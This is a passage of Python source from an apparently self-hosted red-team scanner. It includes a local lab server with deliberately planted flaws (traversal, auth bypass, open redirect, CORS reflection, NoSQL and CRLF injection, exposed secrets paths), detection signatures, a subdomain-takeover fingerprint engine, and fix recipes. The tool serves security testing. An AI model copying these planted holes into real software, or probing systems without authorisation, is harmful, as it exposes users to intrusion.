            elif p == "/file":
                if "../" in q.get("path", ""):
                    self._send(200, "root:x:0:0:root:/root:/bin/bash\n", "text/plain")
                else:
                    self._send(404, "nope", "text/plain")
            elif p == "/api/token":
                if not q.get("token"):
                    self._send(200, json.dumps({"authenticated": True, "bypass": True}))
                else:
                    self._send(200, json.dumps({"authenticated": q["token"] == "known"}))
            elif p == "/api/webhook":
                state["replay_hits"] += 1
                self._send(200, json.dumps({"accepted": True, "effects": state["replay_hits"]}))
            elif p == "/api/coupon":
                try:
                    v = int(q.get("amount", "0"))
                except ValueError:
                    v = 0
                self._send(200, json.dumps({"discount": v, "applied": v != 0}))
            elif p == "/role":
                self._send(200, json.dumps({"role": q.get("role", "user"), "menu": "full" if q.get("role") == "admin" else "basic"}))
            # ── v5.5.0 the battery-expansion flaws ──────────────────────────
            elif p == "/redirect":
                # open redirect: the next param is trusted raw (CWE-601)
                self.send_response(302)
                self.send_header("Location", q.get("next", "/home"))
                self.send_header("Content-Length", "0")
                self.end_headers()
            elif p == "/api/data":
                # CORS misconfig: any Origin reflected with credentials (CWE-942)
                org = self.headers.get("Origin") or "null"
                self._send(200, json.dumps({"data": "session-scoped"}),
                           extra_headers={"Access-Control-Allow-Origin": org,
                                          "Access-Control-Allow-Credentials": "true"})
            elif p == "/api/login2":
                # NoSQL operator injection: $ne/$gt/$regex evaluate (CWE-943)
                pw = q.get("pass", "")
                bypass = any(m in pw for m in ("$ne", "$gt", "$regex", "[$"))
                self._send(200, json.dumps(
                    {"authenticated": bypass or pw == "known",
                     "role": "admin" if bypass else "user"}))
            elif p == "/greet":
                # CRLF: the name value is carried into a response header raw
                name = q.get("name", "")
                self._send(200, f"hello {name}", "text/html",
                           raw_header_value=name if ("\r" in name or "\n" in name) else None)
            elif p in ("/.env", "/.git/HEAD", "/debug", "/phpinfo",
                       "/actuator/env", "/backup.zip"):
                # HARVEST: sensitive material at predictable paths (NO-GAIN:
                # the material is fake, the flaw is the serving)
                material = {
                    "/.env": "SECRET_KEY=spydermonkey-lab\nDATABASE_URL=postgres://lab",
                    "/.git/HEAD": "ref: refs/heads/main\n",
                    "/debug": json.dumps({"paths": ["/api"], "debug": True,
                                          "secret_hint": "SECRET_KEY=***"}),
                    "/phpinfo": "phpinfo() PHP Version => 8.1 … SECRET_KEY=spydermonkey-lab",
                    "/actuator/env": json.dumps({"paths": [], "active": "prod"}),
                    "/backup.zip": "PK\x03\x04 backup dump password=lab-backup",
                }[p]
                self._send(200, material, "text/plain")
            elif p in ("/files/", "/backup/", "/static/", "/data/", "/uploads/"):
                # DIRECTORY: autoindex left on at one root (CWE-548)
                if p == "/files/":
                    self._send(200, "<title>Index of /files</title>"
                               "<a href=\"../\">Parent Directory</a>"
                               "<a href=\"a.txt\">a.txt</a>", "text/html")
                else:
                    self._send(404, "nope", "text/plain")
            else:
                self._send(404, "not found", "text/plain")

        def do_POST(self):
            ln = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(ln).decode("utf-8", "replace")
            if self.path == "/api/user":
                fields = _qs(body)
                fields.setdefault("role", "user")
                self._send(200, json.dumps({"created": True, "fields": fields}))
            else:
                self._send(404, "not found", "text/plain")

    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{port}"


def _tester_verdict(t: dict, payload: str, b: dict, a: dict) -> tuple[bool, bool, str]:
    """Return (differential, decisive, reason).

    A differential is only DECISIVE when the class-specific evidence is present.
    A reflected payload, an unstable baseline, or a generic status/length delta
    is registered as a hypothesis at confidence 0.4 — never suppressed, never
    inflated to CONFIRMED.
    """
    diff = ((b["status"], len(b["body"]), b["sha256"])
            != (a["status"], len(a["body"]), a["sha256"]))
    name = t["name"]
    if not diff and name in ("CORS", "CRLF", "REDIRECT"):
        # header-evidence classes prove in the HEADERS, not the body — a
        # body-identical pair with a header delta is still a live differential
        # (volatile headers excluded so the clock never becomes a finding)
        volatile = {"date", "server", "content-length"}
        _sig = lambda d: {k: v for k, v in (d.get("headers") or {}).items()
                          if k not in volatile}
        diff = _sig(b) != _sig(a)
    if not diff:
        return False, False, "identical responses"
    low = (a["body"] or "").lower()
    atk = (payload or "").lower()
    reflected = bool(atk) and atk in low
    if name == "INJECTION":
        if "7*7" in atk:
            evaluated = "49" in low and "{{7*7}}" not in low and "${7*7}" not in low
            return True, evaluated, ("template expression evaluated (49)" if evaluated
                                     else "marker reflected without evaluation")
        sql_sig = ("sql", "syntax error", "odbc", "mysql", "sqlite",
                   "unterminated", "quoted string")
        if any(s in low for s in sql_sig):
            return True, True, "interpreter error signature"
        return True, False, ("payload reflected without interpreter evidence"
                             if reflected else "differential without interpreter evidence")
    if name == "FILEATTACK":
        if any(s in low for s in ("root:x:0:0", "root:*:0:0", "daemon:")):
            return True, True, "passwd content returned"
        return True, False, "differential without file-content evidence"
    if name == "SSRF":
        if any(s in low for s in ("internal-banner", "internal-config", "169.254",
                                  "metadata", "root:x", "internal service",
                                  "internal-")):
            return True, True, "server-side fetch reached internal content"
        return True, False, "differential without internal-content evidence"
    if name == "AUTHN":
        if any(s in low for s in ('"authenticated": true', '"bypass": true',
                                  '"admin": true', '"role": "admin"')):
            return True, True, "authentication bypass marker"
        return True, False, "differential without auth-bypass evidence"
    if name == "IDOR":
        if reflected and any(s in low for s in ('"org"', '"user_id"', '"email"',
                                                '"account_id"', '"order_id"')):
            return True, True, "foreign object id echoed in the body"
        if reflected and any(s in low for s in ("customer-", "user-", "tenant-",
                                                "org-", "acct-")):
            # a DIFFERENT named principal answered the swapped id — the
            # name-shaped foreign-object echo (generic, not range-tuned)
            return True, True, "different named principal echoed on the swapped id"
        if b["status"] == 200 and a["status"] == 200 and any(
                s in low for s in ('"customer"', '"user"', '"owner"', '"email"')):
            # two 200s naming DIFFERENT object content on adjacent ids — the
            # object-swap echo (the response names the principal it served)
            return True, True, "object content changed on the swapped id"
        return True, False, "differential without foreign-object evidence"
    if name == "AUTHZ":
        for s in ('"role": "admin"', '"is_admin": true', "admin-panel",
                  "admin area", "admin only", "admin dashboard", "revenue=all"):
            if s in low:
                return True, True, "privileged surface returned on the flipped role"
        return True, False, "differential without privileged-surface evidence"
    if name == "AUTHZ_LEGACY":
        return True, False, "differential without privilege evidence"
    if name == "BIZLOGIC":
        accepted = any(s in low for s in ('"applied": true', '"accepted": true',
                                          '"created": true', '"success": true',
                                          '"discount"', '"total"'))
        if reflected and accepted:
            return True, True, "out-of-range value accepted by the business path"
        return True, False, "differential without acceptance evidence"
    if name == "MASSASSIGN":
        if any(s in low for s in ('"role": "admin"', '"is_admin": true',
                                  '"balance": 999999', '"price": 0')):
            return True, True, "unexpected writable field accepted"
        return True, False, "differential without writable-field evidence"
    if name == "REDIRECT":
        # the proof lives in the Location header: the attack response points at
        # a FOREIGN origin while the baseline pointed at the target itself
        al = (a.get("headers") or {}).get("location", "")
        bl = (b.get("headers") or {}).get("location", "")
        if al and al != bl and "probe.invalid" in al.lower():
            return True, True, "Location swapped to a foreign origin"
        if al and al != bl:
            return True, False, "Location changed without a foreign origin"
        return True, False, "differential without Location evidence"
    if name == "CORS":
        acao = (a.get("headers") or {}).get("access-control-allow-origin", "")
        acac = (a.get("headers") or {}).get("access-control-allow-credentials", "")
        b_acao = (b.get("headers") or {}).get("access-control-allow-origin", "")
        if acao and acao != b_acao:
            if acao == "*" and acac == "true":
                return True, True, "wildcard ACAO with allow-credentials"
            if "probe.invalid" in acao:
                return True, True, "foreign Origin echoed into ACAO"
            return True, False, "ACAO present without foreign-origin reflection"
        return True, False, "differential without ACAO evidence"
    if name == "NOSQL":
        if any(s in low for s in ('"authenticated": true', '"role": "admin"',
                                  '"bypass": true', '"login": "ok"')):
            return True, True, "operator payload evaluated — auth bypass marker"
        return True, False, "differential without auth-bypass evidence"
    if name == "CRLF":
        # the injected marker header must appear in the ATTACK response's
        # headers and not in the baseline's — that is the split proof
        a_keys = {k for k in (a.get("headers") or {})}
        b_keys = {k for k in (b.get("headers") or {})}
        injected = a_keys - b_keys
        if any(k in injected for k in ("x-probe", "set-cookie")):
            return True, True, "attacker-controlled header injected into the response"
        if "x-probe" in low or "set-cookie: spy" in low:
            return True, False, "CRLF reflected in the body, not the headers"
        return True, False, "differential without header-injection evidence"
    if name == "HARVEST":
        if any(s in low for s in t.get("signatures", ())):
            return True, True, "sensitive material served at a predictable path"
        return True, False, "differential without sensitive-content evidence"
    if name == "DIRECTORY":
        if any(s in low for s in t.get("signatures", ())):
            return True, True, "autoindex listing served"
        return True, False, "differential without listing evidence"
    if name == "REPLAY":
        # the effects counter incremented across two identical logical requests
        def _effects(d):
            import re as _re
            m = _re.search(r'"(?:effects|count|applied|accepted|processed)"\s*:\s*(\d+)',
                           (d.get("body") or ""))
            return int(m.group(1)) if m else None
        e_b, e_a = _effects(b), _effects(a)
        if e_b is not None and e_a is not None and e_a > e_b:
            return True, True, f"effect repeated on replay ({e_b} → {e_a})"
        if e_b is None and e_a is None:
            return False, False, "no countable effect on this endpoint"
        return True, False, "state changed without a countable effect"
    return True, True, "differential"


# ── v4.2 THE TAKEOVER ENGINE — deterministic DOMTAKE, fully zero-gain ─────────

TAKEOVER_SIGS = [
    {"service": "github-pages", "cname": r"\.github\.io$", "http": "There isn't a GitHub Pages site here.",
     "cwe": "CWE-350", "severity": "high", "test": "claim the repo on github.io and serve content"},
    {"service": "aws-s3", "cname": r"\.s3\.amazonaws\.com$|\.s3-website[\.-]", "http": "NoSuchBucket",
     "cwe": "CWE-350", "severity": "high", "test": "create the bucket in the affected region"},
    {"service": "azure", "cname": r"\.azurewebsites\.net$", "http": "404 Web Site not found",
     "cwe": "CWE-350", "severity": "high", "test": "claim the app-service name"},
    {"service": "cloudfront", "cname": r"\.cloudfront\.net$", "http": "BAD_REQUEST - The request could not be satisfied",
     "cwe": "CWE-350", "severity": "high", "test": "claim the distribution origin"},
    {"service": "heroku", "cname": r"\.herokuapp\.com$", "http": "No such app",
     "cwe": "CWE-350", "severity": "high", "test": "register the heroku app name"},
    {"service": "vercel", "cname": r"\.vercel\.app$", "http": "The deployment could not be found",
     "cwe": "CWE-350", "severity": "medium", "test": "claim the vercel project"},
    {"service": "netlify", "cname": r"\.netlify\.app$|\.netlify\.com$", "http": "Not Found - Request ID",
     "cwe": "CWE-350", "severity": "medium", "test": "claim the netlify site"},
    {"service": "fastly", "cname": r"\.fastly\.net$", "http": "Fastly error: unknown domain",
     "cwe": "CWE-350", "severity": "medium", "test": "claim the fastly service domain"},
    {"service": "shopify", "cname": r"\.myshopify\.com$", "http": "Sorry, this shop is currently unavailable",
     "cwe": "CWE-350", "severity": "medium", "test": "claim the shopify handle"},
    {"service": "tumblr", "cname": r"\.tumblr\.com$", "http": "Whatever you were looking for doesn't currently live at this URL",
     "cwe": "CWE-350", "severity": "medium", "test": "claim the tumblr blog"},
]


def cmd_takeover(args):
    """THE TAKEOVER ENGINE — CNAME → dangling-service fingerprint → NO-GAIN
    verdict. Read-only resolution + one GET; nothing is claimed, nothing gained.
    Every CONFIRMED candidate is an in-scope finding awaiting the disclosure playbook."""
    import socket
    json_mode = _json_mode(args)
    dom = args.domain
    if not _scope_gate(dom, quiet=json_mode):
        return 1
    # gather candidate subdomains: --subdomains file OR the finder's recon state
    subs = [dom]
    if args.subdomains:
        subs += [s.strip() for s in Path(args.subdomains).read_text(errors="replace").splitlines()
                 if s.strip() and "." in s]
    camp = _camp(args.target)
    try:
        h = _load_json(camp / "holyshit-state.json", {})
        subs += [s for s in h.get("subdomains", []) if "." in s]
    except Exception:
        pass
    subs = list(dict.fromkeys(subs))[:200]
    cand, checked = [], 0
    if not json_mode:
        print(f"═══ TAKEOVER ENGINE — {len(subs)} candidate(s) under '{dom}' (read-only · NO-GAIN) ═══")
    for sub in subs:
        cname = None
        try:
            import subprocess as sp2
            r = sp2.run(["dig", "+short", "CNAME", sub], capture_output=True,
                        text=True, timeout=6)
            for ln in r.stdout.splitlines():
                ln = ln.strip().rstrip(".")
                if ln and not _is_ip(ln):
                    cname = ln
                    break
        except Exception:
            cname = None
        if not cname:
            checked += 1
            continue
        sig = next((s for s in TAKEOVER_SIGS if re.search(s["cname"], cname)), None)
        if not sig:
            continue
        checked += 1
        url = f"https://{sub}"
        r = _http(url, timeout=8)
        body = r["body"][:4000]
        if sig["http"].lower() in body.lower() or r["status"] == 404 and sig["service"] in ("aws-s3",):
            cand.append({"subdomain": sub, "cname": cname, "service": sig["service"],
                         "severity": sig["severity"], "cwe": sig["cwe"],
                         "test": sig["test"], "status": "CONFIRMED-NOGAIN",
                         "proof": f"cname {cname} → {sig['service']} fingerprint on "
                                  f"HTTP {r['status']} ('{sig['http'][:40]}…') — "
                                  f"claimable: {sig['test']}"})
            if not json_mode:
                print(f"  🔥 {sub} → {cname} [{sig['service']}] — DANGLING, claimable"
                      f" ({sig['severity']})")
        else:
            if not json_mode:
                print(f"  · {sub} → {cname} [{sig['service']}] — live content, not dangling")
    for c in cand:
        try:
            _cmd_ledger_internal(args.target,
                                 f"subdomain takeover candidate: {c['subdomain']}",
                                 "DOMTAKE", f"https://{c['subdomain']}",
                                 c["severity"], c["proof"], c["cwe"], quiet=json_mode)
        except Exception:
            pass
    payload = {"target": args.target, "domain": dom, "checked": checked,
               "candidates": len(cand), "findings": cand}
    if json_mode:
        _emit(args, payload)
    else:
        print(f"═══ {checked} cname(s) resolved · {len(cand)} dangling candidate(s) · "
              f"all NO-GAIN (nothing claimed) ═══")
    return 0


def _is_ip(host):
    import ipaddress as _ip
    try:
        _ip.ip_address(host)
        return True
    except ValueError:
        return False


# ════════════════════════════════════════════════════════════════════════════
# v5.0 — SELF-KNOWLEDGE · SELF-PROTECTION · GROWTH
# ════════════════════════════════════════════════════════════════════════════

MEM_ROOT = Path.home() / ".redteam" / "memory"


def cmd_capabilities(args):
    """THE MIRROR OF SELF — what this machine can do, introspected LIVE from the
    engines (never a doc): engines × presence, confirmable classes, tools,
    kernel directives, corpus, phases. The planner and any agent ground on this."""
    import importlib.util
    payload = {"version": VERSION, "schema": SCHEMA}
    payload["engines"] = {name: {"present": p.exists(), "role": role}
                          for name, (p, role) in FAMILY.items()}
    payload["confirmable_classes"] = sorted(
        {t["cls"] for t in TESTERS}
        | {p["name"] for p in CHAIN_PATTERNS}
        | set(CLASS_BINDINGS))
    payload["tester_battery"] = {t["name"]: len(t["attacks"]("x") or ["+extra-fields"])
                                 for t in TESTERS}
    payload["takeover_services"] = [s["service"] for s in TAKEOVER_SIGS]
    payload["phases"] = [p["id"] for p in PHASES]
    payload["kernel_directives"] = [
        "scope-init", "barbican-posture", "holy-recon", "undercroft-run",
        "crawl-surface", "testers-run", "gate-AUTHN", "gate-BIZLOGIC",
        "gate-SSRF", "chain-detect", "kage-mirror", "shukaku-ingest",
        "war-report"]
    # the execution layer: arsenal's live inventory (the real tools on THIS machine)
    try:
        spec = importlib.util.spec_from_file_location(
            "arsenal", str(Path(__file__).resolve().parent / "arsenal.py"))
        ar = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(ar)
        inv = ar.installed()
        payload["executors"] = {"total": len(ar.ARSENAL),
                                "installed": sorted(inv),
                                "installed_count": len(inv),
                                "chains": sorted(ar.CHAINS)}
    except Exception as e:
        payload["executors"] = {"error": str(e)[:120]}
    # the corpus
    exp_idx = Path(__file__).resolve().parent.parent / "references" / "skilltree-expanded-index.md"
    if exp_idx.exists():
        payload["corpus"] = sum(1 for l in exp_idx.read_text(errors="replace").splitlines()
                                if l.startswith("- ["))
    payload["priors"] = _priors()
    if _json_mode(args):
        _emit(args, payload)
        return 0
    print(f"═══ SPYDERMONKEY CAPABILITIES (introspected, live) ═══")
    print(f"  engines: {sum(1 for e in payload['engines'].values() if e['present'])}"
          f"/10 on disk · confirmable classes: {len(payload['confirmable_classes'])}")
    print(f"  tester batteries: " + ", ".join(f"{k}={v}" for k, v in
                                               payload["tester_battery"].items()))
    print(f"  executors: {payload['executors'].get('installed_count', 0)}/"
          f"{payload['executors'].get('total', '?')} installed · "
          f"chains: {', '.join(payload['executors'].get('chains', []))}")
    print(f"  takeover fingerprints: {len(payload['takeover_services'])} · "
          f"corpus: {payload.get('corpus', 0)} skill files")
    print(f"  learned priors: " + (", ".join(
        f"{c}={d['hits']}/{d['runs']}" for c, d in payload["priors"].items())
        or "untrained — run: spydermonkey train"))
    return 0


def _priors():
    """Learned per-class hit rates from self-play (train) — the planner orders
    probes by what WORKS. Missing file = untrained."""
    try:
        return _load_json(MEM_ROOT / "spydermonkey-priors.json", {})
    except Exception:
        return {}


def _prior_order(cls_list):
    """Order classes by prior hit-rate (desc), untrained classes in the middle."""
    pr = _priors()
    def rate(c):
        d = pr.get(c)
        if not d or not d.get("runs"):
            return 0.5          # unknown — middle
        return d["hits"] / d["runs"]
    return sorted(cls_list, key=lambda c: -rate(c))


def _estate_memory(target):
    try:
        return _load_json(MEM_ROOT / "estates" / f"{target}.json", {})
    except Exception:
        return {}


def _estate_save(target, mem):
    d = MEM_ROOT / "estates"
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{target}.json").write_text(json.dumps(mem, indent=2) + "\n")


def cmd_memory(args):
    """ESTATE MEMORY — what the family already knows about a target: every
    confirmed class, the dates, the chain candidates, the findings count. The
    planner reads this before it plans."""
    mem = _estate_memory(args.target)
    if args.forget:
        p = MEM_ROOT / "estates" / f"{args.target}.json"
        if p.exists():
            p.unlink()
            print(f"▸ estate memory wiped: {args.target}")
        return 0
    if not mem:
        mem = {"target": args.target, "classes": [], "history": []}
        if _json_mode(args):
            _emit(args, mem)
            return 0
        print(f"· no estate memory for '{args.target}' — first contact (train/loop builds it)")
        return 0
    if _json_mode(args):
        _emit(args, mem)
        return 0
    print(f"═══ ESTATE MEMORY — {args.target} ═══")
    for row in mem.get("history", [])[-10:]:
        print(f"  {row['at'][:10]}  {row['kind']:10s} confirmed={row.get('confirmed', [])}")
    print(f"  known classes: {', '.join(mem.get('classes', [])) or '—'}")
    return 0


def cmd_attack(args) -> int:
    """THE ATT&CK MAP — v7.0: the corpus indexed against MITRE ATT&CK via the
    skilltree bindings; honest comparison against Atomic Red Team (live)."""
    p = Path(__file__).resolve().parent.parent / "references" / "attack-coverage.json"
    try:
        doc = json.loads(p.read_text(encoding="utf-8"))
    except Exception:
        print("✗ attack-coverage.json missing — run scripts/attack_map.py", file=sys.stderr)
        return 1
    if _json_mode(args):
        print(json.dumps(doc, indent=2))
        return 0
    print(f"═══ ATT&CK COVERAGE — {doc['mapped_files']:,} / {doc['total_files']:,} "
          f"files mapped ({doc['coverage_pct']}%) · {doc['technique_count']} techniques ═══")
    art = (doc.get("comparison") or {}).get("atomic_red_team_tests")
    if art:
        print(f"  vs Atomic Red Team: {art} test files "
              f"({doc['mapped_files'] / art:.0f}× the largest public emulation library)")
    for t, v in list(doc["techniques"].items())[:15]:
        print(f"  {t:8s} {v['files']:7,d} files  {','.join(v['cwes'][:3])}")
    print("  map: references/attack-coverage.json · regenerate: scripts/attack_map.py")
    return 0


def cmd_discover(args) -> int:
    """THE SOURCE LANE — v7.0: the discovery engine over the target's own
    source. Read-only, scope-gated, documented classes only; cards land in
    discovery-state.json and fire through the same 3-gate discipline."""
    import discover as _disc
    return _disc.run(
        args.target, args.source, getattr(args, "lang", None),
        int(getattr(args, "limit", 200) or 200),
        bool(getattr(args, "semgrep", False)), bool(_json_mode(args)))


def cmd_train(args):
    """SELF-PLAY TRAINING — the family attacks ITS OWN range (dojo replicas) and
    measures per-class hit rates; the priors file feeds the planner (probe
    ordering) forever. This is how spydermonkey gets better every run."""
    import importlib.util
    dojo = Path.home() / ".hermes/skills/security/dojo/scripts/dojo.py"
    repo_dojo = Path(__file__).resolve().parent.parent.parent / "dojo/scripts/dojo.py"
    env_dojo = os.environ.get("SM_DOJO")  # the smoke pins the range for isolated HOMEs
    for cand in (env_dojo, str(dojo), str(repo_dojo)):
        if cand and Path(cand).exists():
            dojo = Path(cand)
            break
    else:
        dojo = repo_dojo
    if not dojo.exists():
        print("✗ dojo engine not on disk — training needs the range", file=sys.stderr)
        return 1
    spec = importlib.util.spec_from_file_location("dojo_mod", str(dojo))
    dj = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(dj)
    classes = list(dj.CLASSES)
    if args.classes:
        classes = [c for c in classes if c.upper() in
                   {x.strip().upper() for x in args.classes.split(",")}]
    pr = _priors()
    port = args.port
    rows = []
    print(f"═══ SPYDERMONKEY TRAINING — {len(classes)} class(es) × self-play ═══") if not _json_mode(args) else None
    for cls in classes:
        spec_c = dj.CLASSES[cls]
        probe = spec_c["probe"]
        if probe.startswith("POST "):
            continue  # body classes train via the ledger benches, not query testers
        port += 1
        srv = dj._serve(cls, port)
        base_url = f"http://127.0.0.1:{port}"
        probe_path = probe.split(" ")[0]
        rows_before = {r["id"] for r in _ledger_load(args.target)}
        if "?" in probe_path:
            # differential class: the testers strike the probe's own param
            _selfplay_strike(args.target, base_url + probe_path)
            got = {r["cls"] for r in _ledger_load(args.target)
                   if r["status"] == "CONFIRMED" and r["id"] not in rows_before}
        else:
            # fingerprint class (HARVEST/DIRECTORY/CRYPTO/NETWORK/REPLAY):
            # no params — the family's proof is the probe + confirm-string
            ok = dj._strike(base_url + probe_path, spec_c["confirm"])
            got = {cls} if ok else set()
        srv.shutdown()
        hit = 1 if got else 0
        d = pr.setdefault(cls, {"hits": 0, "runs": 0})
        d["hits"] += hit
        d["runs"] += 1
        rows.append((cls, hit, sorted(got)))
        if not _json_mode(args):
            print(f"  {'✓' if hit else '✗'} {cls:10s} → testers confirmed: "
                  f"{', '.join(sorted(got)) or 'nothing'}")
    MEM_ROOT.mkdir(parents=True, exist_ok=True)
    (MEM_ROOT / "spydermonkey-priors.json").write_text(
        json.dumps(pr, indent=2) + "\n")
    hits = sum(h for _, h, _ in rows)
    if _json_mode(args):
        _emit(args, {"target": args.target, "rows": [
            {"cls": c, "hit": h, "confirmed": g} for c, h, g in rows],
            "priors": pr, "hit_rate": round(hits / max(1, len(rows)), 2),
            "priors_file": str(MEM_ROOT / "spydermonkey-priors.json")})
        return 0
    print(f"═══ training pass: {hits}/{len(rows)} class(es) confirmed by the testers "
          f"· priors written ({MEM_ROOT / 'spydermonkey-priors.json'}) ═══")
    print("  the planner now orders probes by what works — the family gets sharper every run")
    return 0


def _selfplay_strike(target, url):
    """Run the differential testers against one replica probe (in-process, silent)."""
    import io, contextlib
    args = type("A", (), {"target": target, "url": [url], "demo": False,
                          "json": False, "timeout": 6})()
    with contextlib.redirect_stdout(io.StringIO()):
        return cmd_testers(args)


_FIX_RECIPES = {
    "IDOR": "enforce object ownership server-side: every object fetch resolves through the session's org/user scope — never trust org_id/user_id from the request; add an ownership check at the data layer, not the UI.",
    "AUTHZ": "authorize by server-side role/level only; strip role/level/admin params from client trust; deny-by-default middleware on privileged routes.",
    "MASSASSIGN": "allow-list writable fields per endpoint (DTO/marshalling with explicit fields); reject unknown keys instead of reflecting them into the model.",
    "INJECTION": "parameterize every interpreter call (prepared statements, template auto-escape, exec disallowed); never string-build commands or queries from request data.",
    "AUTHN": "reject empty/default/placeholder factors explicitly; second factors must be verified server-side per request, never assumed from presence.",
    "BIZLOGIC": "server-side domain validation on quantities/amounts: ranges, signs, currency decimal math; reject negatives/zero/overflow at the model boundary.",
    "SSRF": "allow-list outbound fetch targets (scheme+host); resolve and reject loopback/link-local/metadata ranges; never fetch a client-named URL directly.",
    "TRAVERSAL": "normalize and resolve the path, then verify it is inside the intended root (realpath containment); never pass client paths to filesystem calls raw.",
    "JWT": "verify the signature server-side with a trusted key; pin the algorithm allow-list (reject alg=none); validate exp/iss/aud on every request.",
    "XSS": "context-encode every reflection (HTML/attr/JS/URL encoders per sink); template auto-escape on; never build markup from request data.",
    "SESSION": "use high-entropy CSPRNG session ids; invalidate on re-auth; never accept sequential/enumerable identifiers.",
}


def cmd_remediate(args):
    """THE FIX LOOP — RedAmon's beat, re-proven: every CONFIRMED finding gets
    a real fix recipe, and on LAB assets the loop re-runs the differential
    post-fix. FIXED means the differential no longer confirms — machine-checked,
    never claimed. Walls: recipe-only for anything outside the lab."""
    rows = _ledger_load(args.target)
    row = next((r for r in rows if r["id"] == args.id), None)
    if not row:
        print(f"✗ no finding {args.id} in '{args.target}'", file=sys.stderr)
        return 2
    cls = row["cls"]
    recipe = _FIX_RECIPES.get(cls, "documented-class fix: sanitize at the sink, authorize at the layer that owns the object.")
    asset = row["asset"]
    from urllib.parse import urlsplit as _us
    host = _us(asset).netloc.split(":")[0]
    lab = host in ("127.0.0.1", "localhost") or host.startswith(("10.", "192.168."))
    out = {"target": args.target, "id": args.id, "cls": cls,
           "asset": asset, "recipe": recipe, "mode": "recipe-only"}
    if _json_mode(args):
        pass  # payload finalized after the re-proof below
    else:
        print(f"═══ SPYDERMONKEY REMEDIATE — {args.id} ({cls}) ═══")
        print(f"  asset: {asset}")
        print(f"  fix recipe: {recipe}")
    fixed = None
    if args.reproof:
        if not lab:
            if not _json_mode(args):
                print("  ▸ asset outside the lab wall — recipe-only (no live re-proof)")
            fixed = None
        else:
            if not _json_mode(args):
                print("  ▸ re-proof: re-running the differential post-fix…")
            before = {r["id"] for r in _ledger_load(args.target)}
            reach = _http(asset if "?" in asset else asset, timeout=6)
            if reach.get("error") or reach["status"] >= 500:
                if not _json_mode(args):
                    print("  ▸ target unreachable — no re-proof possible (fixed=unknown)")
                out["mode"] = "unreachable"
                fixed = None
            else:
                import io as _io, contextlib as _cl, json as _js
                rargs = type("A", (), {"target": args.target, "url": [asset],
                                       "demo": False, "json": True, "timeout": 6})()
                buf = _io.StringIO()
                with _cl.redirect_stdout(buf):
                    cmd_testers(rargs)
                payload = None
                for line in buf.getvalue().splitlines():
                    line = line.strip()
                    if line.startswith("{"):
                        try:
                            payload = _js.loads(buf.getvalue()[
                                buf.getvalue().index(line):])
                            break
                        except Exception:
                            continue
                still = bool(payload and payload.get("confirmed"))
                fixed = not still
            out["mode"] = "re-proven" if fixed is not None else "unreachable"
            if fixed is not None:
                note = ("REMEDIATION VERIFIED — differential no longer confirms"
                        if fixed else "REMEDIATION FAILED — differential still confirms")
                out["verdict"] = note
                if not _json_mode(args):
                    print(f"  {'✓' if fixed else '✗'} {note}")
                _cmd_ledger_internal(args.target, f"remediation re-proof: {args.id}",
                                     cls, asset,
                                     "high" if not fixed else "info",
                                     "baseline/attack/diff recorded pre-fix; post-fix "
                                     "differential " + ("no longer confirms" if fixed
                                                        else "STILL CONFIRMS"),
                                     quiet=True)
    if _json_mode(args):
        _emit(args, out)
        return 0 if (fixed is not False) else 1
    return 0 if (fixed is not False) else 1


_CATALOG_CACHE = None

def _catalog() -> list:
    """THE KNOWN-TOOL CATALOG — lazy-loaded once per process. This is a
    reference index of known offensive tooling (names, categories, one-line
    descriptions, source pedigree). It NEVER executes anything: firing any of
    these goes through `arsenal` (installed tools only, scope-gated, kernel
    result schema). Nothing in here is a weapon; it is a map."""
    global _CATALOG_CACHE
    if _CATALOG_CACHE is None:
        p = Path(__file__).resolve().parent.parent / "references" / "tool-catalog.json"
        try:
            _CATALOG_CACHE = json.loads(p.read_text(encoding="utf-8"))
            if not isinstance(_CATALOG_CACHE, list):
                _CATALOG_CACHE = []
        except Exception:
            _CATALOG_CACHE = []
    return _CATALOG_CACHE


_CATALOG_SURGE_CACHE = None


def _catalog_surge() -> list:
    """v7.0 SURGE INDEX — the public corpora (Exploit-DB · Nuclei · Metasploit)
    as a separate lazy-loaded file. Same discipline: a map, never an armory."""
    global _CATALOG_SURGE_CACHE
    if _CATALOG_SURGE_CACHE is None:
        p = Path(__file__).resolve().parent.parent / "references" / "tool-catalog-surge.json"
        try:
            doc = json.loads(p.read_text(encoding="utf-8"))
            sections = doc.get("sections", {}) if isinstance(doc, dict) else {}
            rows: list = []
            for v in sections.values():
                rows.extend(v)
            _CATALOG_SURGE_CACHE = rows
        except Exception:
            _CATALOG_SURGE_CACHE = []
    return _CATALOG_SURGE_CACHE


def cmd_catalog(args) -> int:
    action = getattr(args, "action", "stats") or "stats"
    if action in ("runbook", "materialize"):
        if not getattr(args, "kind", None) or not getattr(args, "id", None):
            raise UsageError(f"catalog {action} needs --kind and --id")
        mz = Path(__file__).resolve().parent / "catalog_materialize.py"
        argv = [sys.executable, str(mz), action, "--kind", args.kind,
                "--id", args.id]
        if action == "materialize":
            if getattr(args, "out", None):
                argv += ["--out", args.out]
            if getattr(args, "dry_run", False):
                argv += ["--dry-run"]
        if getattr(args, "json", False):
            argv += ["--json"]
        return subprocess.run(argv).returncode
    cat = _catalog()
    cat_filter = (getattr(args, "cat", None) or "").lower().strip()
    limit = max(1, int(getattr(args, "limit", 50) or 50))
    term = getattr(args, "term", None) or ""

    def _rows(rows):
        kind = {"exploit-db": "exploit-db", "nuclei-templates": "nuclei",
                "metasploit": "metasploit"}
        out = []
        for r in rows:
            row = {"name": r.get("name"), "cat": r.get("cat"),
                   "desc": r.get("desc"), "mode": r.get("mode"),
                   "src": r.get("src", "curated")}
            k = kind.get(row["src"])
            if k:
                row["how"] = (f"spydermonkey catalog runbook --kind {k} --id "
                              f"{row['name']}   (materialize → "
                              f"spydermonkey catalog materialize --kind {k} "
                              f"--id {row['name']})")
            out.append(row)
        return out

    def _filtered(rows):
        if not cat_filter:
            return list(rows)
        return [r for r in rows if (r.get("cat") or "").lower().startswith(cat_filter)]

    if action == "stats":
        from collections import Counter
        from datetime import datetime as _dt, timezone as _tz
        surge = _catalog_surge()
        surge_age = None
        try:
            sp = Path(__file__).resolve().parent.parent / "references" / "tool-catalog-surge.json"
